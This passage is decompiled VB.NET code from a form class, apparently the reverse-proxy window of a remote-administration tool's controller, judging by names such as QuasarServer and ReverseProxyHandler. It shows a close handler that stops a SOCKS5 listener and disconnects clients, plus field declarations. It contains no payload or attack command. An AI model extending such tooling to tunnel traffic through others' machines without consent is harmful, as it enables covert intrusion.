		' Token: 0x0600128E RID: 4750 RVA: 0x000A7E60 File Offset: 0x000A6060
		Private Sub FrmClose_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim flag As Boolean = Operators.CompareString(Me.Start.Text, "Stop listening", False) = 0 AndAlso Me.ListenServer.Listening
				If flag Then
					Me.StopSocks5()
					Me.ListenServer.Disconnect()
				End If
				Dim flag2 As Boolean = Me.ParentClient.TcpClient.Connected OrElse Me.Client.TcpClient.Connected
				If flag2 Then
					Dim client As Clients = Me.Client
					If client IsNot Nothing Then
						client.Disconnected()
					End If
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x0600128F RID: 4751 RVA: 0x000A7E75 File Offset: 0x000A6075
		Private Sub ServerPort_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000813 RID: 2067
		Private Running As Boolean

		' Token: 0x04000814 RID: 2068
		Private ClientConnect As Boolean

		' Token: 0x04000815 RID: 2069
		Private QueueConnections As Queue(Of KeyValuePair(Of Client, Boolean))

		' Token: 0x04000816 RID: 2070
		Private ClientConnectionsLock As Object

		' Token: 0x04000817 RID: 2071
		Private LockClients As Object

		' Token: 0x04000818 RID: 2072
		Private random As Random

		' Token: 0x04000819 RID: 2073
		Public ListenServer As QuasarServer

		' Token: 0x0400081A RID: 2074
		Private ReverseProxyHandler As ReverseProxyHandler

		' Token: 0x0400081B RID: 2075
		Private OpenConnections As ReverseProxyClient()

		' Token: 0x0400081C RID: 2076
		Private StatuePort As Boolean

		' Token: 0x0400081D RID: 2077
		Private StatueProxy As Boolean

		' Token: 0x04000822 RID: 2082
		Private FormSize As Boolean

		' Token: 0x04000823 RID: 2083
		Public ClientRunning As Boolean
	End Class
End Namespace
